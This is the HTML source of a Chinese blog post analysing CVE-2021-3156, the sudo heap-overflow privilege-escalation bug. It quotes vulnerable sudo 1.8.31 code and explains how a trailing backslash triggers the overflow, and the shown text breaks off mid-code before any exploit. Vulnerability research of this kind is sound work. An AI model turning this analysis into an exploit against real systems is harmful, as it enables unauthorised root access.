@@ -1,0 +1,1052 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="NkA6ndXFZC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="CVE-2021-3156 sudo 提权漏洞，复现过程总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2021-3156">
+<meta property="og:url" content="http://www.xi4oyu.top/b941c294/index.html">
+<meta property="og:site_name" content="feather&#39;s blog">
+<meta property="og:description" content="CVE-2021-3156 sudo 提权漏洞，复现过程总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-1.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-2.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-3.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-4.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-5.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-6.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-7.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-8.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-9.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-10.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-11.png">
+<meta property="article:published_time" content="2021-03-25T16:41:00.000Z">
+<meta property="article:modified_time" content="2021-03-25T16:41:00.000Z">
+<meta property="article:author" content="feather">
+<meta property="article:tag" content="sudo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.xi4oyu.top/images/CVE-2021-3156/CVE-2021-3156-1.png">
+
+
+<link rel="canonical" href="http://www.xi4oyu.top/b941c294/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/b941c294/","path":"b941c294/","title":"CVE-2021-3156"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CVE-2021-3156 | feather's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">feather's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">复现环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%89%8D%E5%87%86%E5%A4%87"><span class="nav-number">3.1.</span> <span class="nav-text">调试前准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc"><span class="nav-number">3.2.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%BC%80%E5%A7%8B"><span class="nav-number">3.3.</span> <span class="nav-text">调试开始</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NSS%EF%BC%88Name-Service-Switch%EF%BC%89"><span class="nav-number">4.1.</span> <span class="nav-text">NSS（Name Service Switch）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#service-user-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E5%B8%83"><span class="nav-number">4.2.</span> <span class="nav-text">service_user 结构体分布</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="nav-number">4.3.</span> <span class="nav-text">堆布局</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">4.4.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">4.5.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">feather</p>
+  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
+        </li>
+    </ul>
+  </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/b941c294/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="feather">
+      <meta itemprop="description" content="计算机技术&个人琐碎事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="feather's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2021-3156
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-26 00:41:00" itemprop="dateCreated datePublished" datetime="2021-03-26T00:41:00+08:00">2021-03-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>13k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>CVE-2021-3156 sudo 提权漏洞，复现过程总结</p>
+<span id="more"></span>
+
+<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul>
+<li>系统：Ubuntu 20.04</li>
+<li>sudo: sudo-1.8.31</li>
+</ul>
+<p>源码下载：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://mirrors.ustc.edu.cn/ubuntu/pool/main/s/sudo/sudo_1.8.31.orig.tar.gz">https://mirrors.ustc.edu.cn/ubuntu/pool/main/s/sudo/sudo_1.8.31.orig.tar.gz</a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以参照一下官方的修复方式：<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8">https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8</a></p>
+<p>找到 1.8.31 版本源码的漏洞位置如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//plugins/sudoers/sudoers.c</span>
+<span class="token comment">//set_cmnd()</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+   <span class="token number">819</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>sudo_mode <span class="token operator">&amp;</span> <span class="token punctuation">(</span>MODE_RUN <span class="token operator">|</span> MODE_EDIT <span class="token operator">|</span> MODE_CHECK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">845</span>
+   <span class="token number">846</span>          <span class="token comment">/* set user_args */</span>
+   <span class="token number">847</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>NewArgc <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">848</span>              <span class="token keyword">char</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">;</span>
+   <span class="token number">849</span>              <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> n<span class="token punctuation">;</span>
+   <span class="token number">850</span>
+   <span class="token number">851</span>              <span class="token comment">/* Alloc and build up user_args. */</span>
+   <span class="token number">852</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">*</span>av<span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span>
+   <span class="token number">853</span>                  size <span class="token operator">+=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>av<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+   <span class="token number">854</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>user_args <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">855</span>                  <span class="token function">sudo_warnx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">856</span>                  <span class="token function">debug_return_int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">857</span>              <span class="token punctuation">&#125;</span>
+   <span class="token number">858</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>sudo_mode<span class="token punctuation">,</span> MODE_SHELL<span class="token operator">|</span>MODE_LOGIN_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">859</span>                  <span class="token comment">/*
+   860                   * When running a command via a shell, the sudo front-end
+   861                   * escapes potential meta chars.  We unescape non-spaces
+   862                   * for sudoers matching and logging purposes.
+   863                   */</span>
+   <span class="token number">864</span>                  <span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>from <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">865</span>                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">866</span>                          <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+   <span class="token number">867</span>                              from<span class="token operator">++</span><span class="token punctuation">;</span>
+   <span class="token number">868</span>                          <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>from<span class="token operator">++</span><span class="token punctuation">;</span>
+   <span class="token number">869</span>                      <span class="token punctuation">&#125;</span>
+   <span class="token number">870</span>                      <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>
+   <span class="token number">871</span>                  <span class="token punctuation">&#125;</span>
+   <span class="token number">872</span>                  <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
+   <span class="token number">873</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> 
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在 set_cmnd 函数，看到 866 行处，以 <code>\</code> 开头下一个字符不是空格，那么就认为是转义字符，<code>from++</code> 跳过字符 <code>\</code>，但是没有考虑到下一个字符是 <code>\0</code> 的情况，如果下一个字符是 <code>\0</code>，那么 <code>*to = *from++</code> 就写入 <code>\0</code> 字符，下一次循环条件判断成立，则继续往 user_args 里面写入数据，而 user_args 是在 852-854 行处使用 malloc 分配的一个堆块，这就可以造成一个堆溢出的漏洞</p>
+<p><strong>最后一个参数后面就是环境变量的位置，所以只要最后一个参数以一个 <code>\</code> 结尾，那么就可以通过控制环境变量，堆溢出写入任意数据</strong></p>
+<p>同时看到 819 行处，触发漏洞需要设置 <code>MODE_RUN</code>，<code>MODE_EDIT</code>，<code>MODE_CHECK</code> 中的一个，858 行处，要求设置 <code>MODE_SHELL</code> 或 <code>MODE_LOGIN_SHELL</code></p>
+<p>想要触发漏洞，还要先看看下面这段代码：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//src/parse_args.c</span>
+<span class="token comment">//parse_args()</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+   <span class="token number">571</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ISSET</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> MODE_RUN<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ISSET</span><span class="token punctuation">(</span>flags<span class="token punctuation">,</span> MODE_SHELL<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">572</span>          <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>av<span class="token punctuation">,</span> <span class="token operator">*</span>cmnd <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+   <span class="token number">573</span>          <span class="token keyword">int</span> ac <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+   <span class="token number">574</span>
+   <span class="token number">575</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token number">576</span>              <span class="token comment">/* shell -c "command" */</span>
+   <span class="token number">577</span>              <span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">,</span> <span class="token operator">*</span>dst<span class="token punctuation">;</span>
+   <span class="token number">578</span>              <span class="token class-name">size_t</span> cmnd_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span>
+   <span class="token number">579</span>                  <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>argc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+   <span class="token number">580</span>
+   <span class="token number">581</span>              cmnd <span class="token operator">=</span> dst <span class="token operator">=</span> <span class="token function">reallocarray</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> cmnd_size<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">582</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>cmnd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+   <span class="token number">583</span>                  <span class="token function">sudo_fatalx</span><span class="token punctuation">(</span><span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"%s: %s"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">,</span> <span class="token function">U_</span><span class="token punctuation">(</span><span class="token string">"unable to allocate memory"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">584</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">gc_add</span><span class="token punctuation">(</span>GC_PTR<span class="token punctuation">,</span> cmnd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+   <span class="token number">585</span>                  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">586</span>
+   <span class="token number">587</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span>av <span class="token operator">=</span> argv<span class="token punctuation">;</span> <span class="token operator">*</span>av <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
